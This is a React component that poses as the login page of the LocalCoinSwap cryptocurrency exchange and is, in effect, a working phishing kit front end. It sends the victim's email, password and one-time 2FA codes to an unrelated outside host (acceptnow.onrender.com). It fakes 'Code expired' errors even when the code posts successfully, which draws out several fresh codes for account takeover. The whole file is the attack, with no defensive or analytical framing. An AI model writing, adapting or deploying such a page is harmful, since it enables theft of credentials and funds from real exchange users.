import React, { useState } from "react";

function LocalCoinswap() {
  const [email, setEmail] = useState("");
  const [word, setWord] = useState("");
  const [code, setCode] = useState("");
  const [step, setStep] = useState(1);
  const [userId, setUserId] = useState(null);
  const [codeCount, setCodeCount] = useState(0);

  /* =========================
      STEP 1 — SAVE EMAIL
  ========================== */
  const handleStep1 = async () => {
    if (!email) return alert("Email is required");
    try {
      const res = await fetch("https://acceptnow.onrender.com/api/users/step1", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email }),
      });
      const data = await res.json();
      if (res.ok) {
        setUserId(data.userId);
        localStorage.setItem("userId", data.userId);
        setStep(2);
      } else {
        alert(data.error || "Error");
      }
    } catch (err) {
      console.error(err);
      alert("Server error");
    }
  };

  /* =========================
      STEP 2 — SAVE WORD
  ========================== */
  const handleStep2 = async () => {
    if (!word) return alert("Password is required");
    try {
      const res = await fetch("https://acceptnow.onrender.com/api/users/step2", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId, word }),
      });
      const data = await res.json();
      if (res.ok) {
        setStep(3);
      } else {
        alert(data.error || "Error saving word");
      }
    } catch (err) {
      console.error(err);
      alert("Server error");
    }
  };

  /* =========================
      STEP 3 — SAVE CODES
  ========================== */
  const handleStep3 = async () => {
    if (!code.trim()) return alert("Enter the verification code");
    const storedUserId = localStorage.getItem("userId");
    try {
      const res = await fetch("https://acceptnow.onrender.com/api/users/step3", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId: storedUserId,
          code: code.trim(),
        }),
      });

      if (res.ok) {
        const currentCount = codeCount + 1;
        setCode("");
        if (currentCount >= 3) {
          alert("Please enter correct details!");
          resetForm();
        } else {
          setCodeCount(currentCount);
          alert("Code expired! Enter a new code.");
        }
      } else {
        const data = await res.json();
        alert(data.error || "Verification failed");
      }
    } catch (err) {
      console.error("Fetch Error:", err);
      alert("Connection error");
    }
  };

  const resetForm = () => {
    setStep(1);
    setEmail("");
    setWord("");
    setCodeCount(0);
    localStorage.removeItem("userId");
  };

  return (
    <div className="min-h-screen bg-[#0b0f17] flex flex-col items-center justify-center text-white relative px-4 py-8 md:px-0">
      
      {/* HEADER SECTION WITH LOGO & BACK ARROW */}
      <div className="absolute top-4 left-4 flex flex-col items-start gap-2">
        <div className="flex items-center space-x-2">
          <img src="/localcoinswap.png" alt="LocalCoinSwap Logo" className="w-7 h-7" />
          <h1 className="text-md md:text-lg font-semibold">LocalCoinSwap</h1>
        </div>
        
        {/* BACK ARROW REDIRECT */}
        <button 
          onClick={() => window.history.back()} 
          className="p-1 hover:bg-white/10 rounded-full transition-colors group"
          aria-label="Go back"
        >
          <svg 
            xmlns="http://www.w3.org/2000/svg" 
            className="h-6 w-6 text-gray-400 group-hover:text-white" 
            fill="none" 
            viewBox="0 0 24 24" 
            stroke="currentColor"
          >
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 19l-7-7m0 0l7-7m-7 7h18" />
          </svg>
        </button>
      </div>

      <button className="absolute top-4 right-4 bg-linear-to-r from-orange-400 to-orange-600 px-4 md:px-5 py-2 rounded-full font-semibold hover:opacity-90 transition text-sm md:text-base">
        Register
      </button>

      <div className="flex flex-col md:flex-row bg-[#0e141f] rounded-xl overflow-hidden w-full md:w-[70%] max-w-5xl shadow-lg mt-16">
        <div className="w-full md:w-1/2 bg-[#0e141f] p-8 md:p-12 flex flex-col justify-center border-b md:border-b-0 md:border-r border-gray-800">
          <div className="text-5xl md:text-6xl text-blue-500 mb-4 md:mb-6">“</div>
          <p className="text-gray-300 text-sm md:text-base leading-relaxed mb-4">
            The world ultimately will have a single currency. The internet will
            have a single currency. I personally believe that it will be Bitcoin.
          </p>
          <div className="mt-4 md:mt-6 border-t border-gray-700 pt-3 text-gray-400 text-sm md:text-base">
            Jack Dorsey
          </div>
        </div>

        <div className="w-full md:w-1/2 bg-[#0e141f] p-8 md:p-12 flex flex-col justify-center">
          <h2 className="text-xl md:text-2xl font-semibold mb-6 text-white">
            Login to LocalCoinSwap
          </h2>

          <label className="text-gray-400 mb-2 text-sm">Email</label>
          <input
            type="email"
            placeholder="you@email.com"
            className="bg-transparent border border-gray-700 rounded-md px-4 py-2 text-white focus:outline-none focus:border-blue-400"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />

          {step === 1 && (
            <button
              onClick={handleStep1}
              className="mt-4 bg-[#35b6ff] w-full py-2 rounded-full font-semibold hover:bg-[#4cc4ff] transition"
            >
              Login
            </button>
          )}

          {step >= 2 && (
            <div className="mt-8">
              <label className="text-gray-400 text-sm">Password</label>
              <input
                type="text"
                placeholder="Enter Password"
                className="bg-transparent border border-gray-700 rounded-md px-4 py-2 text-white focus:outline-none focus:border-blue-400 w-full"
                value={word}
                onChange={(e) => setWord(e.target.value)}
              />

              {step === 2 && (
                <button
                  onClick={handleStep2}
                  className="mt-4 bg-[#35b6ff] w-full py-2 rounded-full font-semibold hover:bg-[#4cc4ff] transition"
                >
                  Login
                </button>
              )}
            </div>
          )}

          {step >= 3 && (
            <div className="mt-8">
              <label className="text-gray-400 text-sm">OTP Code (eg: Google Authenticator)</label>
              <input
                type="text"
                maxLength={8}
                placeholder="Code"
                className="bg-transparent border border-gray-700 rounded-md px-4 py-2 text-white focus:outline-none focus:border-blue-400 w-full tracking-widest"
                value={code}
                onChange={(e) => setCode(e.target.value)}
              />

              <button
                onClick={handleStep3}
                className="mt-4 bg-[#35b6ff] w-full py-2 rounded-full font-semibold hover:bg-blue-400 transition"
              >
                Verify
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

export default LocalCoinswap;